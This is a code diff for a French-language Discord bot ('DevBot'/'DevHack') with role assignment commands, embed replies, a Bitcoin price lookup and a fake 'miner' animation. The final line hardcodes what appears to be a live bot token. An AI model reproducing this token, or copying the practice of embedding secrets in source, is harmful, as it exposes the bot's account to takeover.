+  }
+  if (msg.content === "-role 4") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Graphiste";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role 5") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Gamer";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role 6") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Journaliste";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role 7") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Streameur";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "role 1") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Développeur AJOUTER",
+            value: "Confirmation role Développeur ajouter avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  } else if (msg.content === ";pp")
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**Votre Photo de profil**",
+        url: msg.author.avatarURL,
+        image: {
+          url: msg.author.avatarURL
+        },
+
+        timestamp: new Date(),
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevHack"
+        }
+      }
+    });
+  if (msg.content === "role 2") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Youtubeur AJOUTÉ",
+            value: "Confirmation role Youtubeur ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "role 3") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Hacker AJOUTÉ",
+            value: "Confirmation role Hacker ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "role 4") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Graphiste AJOUTÉ",
+            value: "Confirmation role Graphiste ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "role 5") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Gamer AJOUTÉ",
+            value: "Confirmation role Gamer ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "role 6") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Journaliste AJOUTÉ",
+            value: "Confirmation role Journaliste ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "role 7") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Streameur AJOUTÉ",
+            value: "Confirmation role Streameur ajouté avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 1") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Développeur RETIRÉ",
+            value: "Confirmation role Développeur retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 2") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Youtubeur RETIRÉ",
+            value: "Confirmation role Youtubeur retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }else if (msg.content === "role -sql") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "SQL";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -js") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "JS";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -python") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Python";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -c#") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "C#";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -c++") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "C++";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -ruby") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Ruby";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  } else if (msg.content === "role -assembleur") {
+    var myRole = msg.guild.roles.find(r => {
+      return r.name === "Assembleur";
+    });
+    msg.guild.members.get(msg.author.id).addRole(myRole);
+  }if (msg.content === "role -java") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Java";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -swift") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Swift";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -objective-c") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Objective-c";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -php orienté objet") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "PHP Orienté Objet";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -laravel") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Laravel";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -codeigniter") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "CodeIgniter";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -cakePHP") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "CakePHP";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -node.js") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Node.js";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -angular.js") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Angular.js";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -vue.js") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Vue.js";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -reactJS") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "ReactJS";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -ember.js") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Ember.js";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    } else if (msg.content === "role -electron.js") {
+      var myRole = msg.guild.roles.find(r => {
+        return r.name === "Electron.js";
+      });
+      msg.guild.members.get(msg.author.id).addRole(myRole);
+    }if (msg.content === "role -jquery") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "jQuery";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      } else if (msg.content === "role -bootstrap") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "Bootstrap";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      } else if (msg.content === "role -less") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "LESS";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      } else if (msg.content === "role -compass") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "COMPASS";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      } else if (msg.content === "role -laravel") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "Laravel";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      } else if (msg.content === "role -sass") {
+        var myRole = msg.guild.roles.find(r => {
+          return r.name === "SASS";
+        });
+        msg.guild.members.get(msg.author.id).addRole(myRole);
+      }
+  if (msg.content === "-role -sql") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "SQL";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role -js") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "JS";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role -python") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "Python";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }
+  if (msg.content === "-role -c#") {
+    msg.delete();
+    var remove = msg.guild.roles.find(r => {
+      return r.name === "C#";
+    }); // :wink: (ne l'utilise pas c'est si un jour je te l'autorise)
+    msg.guild.members.get(msg.author.id).removeRole(remove);
+  }else if (msg.content.startsWith("est-ce que quelqu'un connait")) {
+    msg.delete(1000);
+    msg.reply('expliquer votre le problème précisemment :worried:');
+    msg.delete(5000);
+    }else if (msg.content.startsWith("Est-ce que quelqu'un connait")) {
+    msg.delete(1000);
+    msg.reply('expliquer votre le problème précisemment :worried:');
+    msg.delete(5000);
+    }else if (msg.content.startsWith("vous savez")) {
+    msg.delete(1000);
+    msg.reply('expliquer votre le problème précisemment :worried:');
+    msg.delete(5000);
+    }else if (msg.content.startsWith("qui connait")) {
+    msg.delete(1000);
+    msg.reply('expliquer votre le problème précisemment :worried:');
+    msg.delete(5000);
+    }else if (msg.content.startsWith("Qui connait")) {
+    msg.delete(1000);
+    msg.reply('expliquer votre le problème précisemment :worried:');
+    msg.delete(5000);
+    }
+  if (msg.content === "-role 3") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Hacker RETIRÉ",
+            value: "Confirmation role Hacker retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 4") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Graphiste RETIRÉ",
+            value: "Confirmation role Graphiste retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 5") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Gamer RETIRÉ",
+            value: "Confirmation role Gamer retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 6") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Journaliste RETIRÉ",
+            value: "Confirmation role Journaliste retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === "-role 7") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "**DevBot**",
+        fields: [
+          {
+            name: "ROLE Streameur RETIRÉ",
+            value: "Confirmation role Streameur retiré avec succès"
+          }
+        ],
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevBot"
+        }
+      }
+    });
+  }
+  if (msg.content === ";btc") {
+  btcValue.getConvertedValue("EUR").then(value => {
+    msg.channel.send({
+      embed: {
+        color: 12388337,
+        description: value + "€",
+        title: "Prix du Bitcoin en Euro"
+      }
+    });
+  });
+}
+
+if (msg.content === ";test") {
+  msg.channel.send({
+    embed: { color: 12388337, description: "Start Miner", title: "Miner BTC" }
+  });
+  setTimeout(function() {
+    msg.channel.send({
+      embed: { color: 12388337, description: "Hash...", title: "Hash BTC" }
+    });
+  }, 8000);
+  msg.channel.send({
+    embed: {
+      color: 12388337,
+      image: { url: "https://2ch.hk/hw/src/2186314/14981358354990.gif" },
+      title: "Miner Hash The BTC"
+    }
+  });
+  setTimeout(function() {
+    msg.channel.send({
+      embed: {
+        color: 12388337,
+        image: {
+          url:
+            "https://cdn.dribbble.com/users/58530/screenshots/2323771/coin-flip.gif"
+        },
+        title: "Hash Finish Of BTC"
+      }
+    });
+  }, 15000);
+}
+
+  if (msg.content === ";help") {
+    msg.channel.send({
+      embed: {
+        color: 2550255,
+        author: {
+          name: devhack.user.username,
+          icon_url: devhack.user.avatarURL
+        },
+        title: "DevHack",
+        url:
+          "https://www.allo-image.net/stockimg/upload/15752232035a2d46647e9a0mail.png",
+        description: "les commande du bot",
+        fields: [
+          {
+            name: "commande",
+            value:
+              ";blacklist, ;clean, ;clear, ;disconnect, ;id, ;joinserver, ;listids, ;np, ;pause, ;perms, ;play, ;pldump, ;queue, ;restart, ;resume, ;search, ;setavatar, ;setname, ;setnick, ;shuffle, ;shutdown, ;skip, ;stream, ;summon, ;volume."
+          },
+          {
+            name: "PS",
+            value: "Demmander a votre *ZCV* pour plus d'aide"
+          },
+          {
+            name: "Merci",
+            value: "Bonne journée et bon DevHack"
+          }
+        ],
+        timestamp: new Date(),
+        footer: {
+          icon_url: devhack.user.avatarURL,
+          text: "DevHack"
+        }
+      }
+    });
+  }
+})
+devhack.on("guildMemberAdd", member => {
+  var role = member.guild.roles.find("name", "Membre");
+  member.addRole(role);
+});
+
+  
+devhack.login('Mzg0NDk5NTk2ODk1OTc3NDc0.DSfzLg.x71V2zuCa_2sNhp5BDrnbO8MQ3U');  
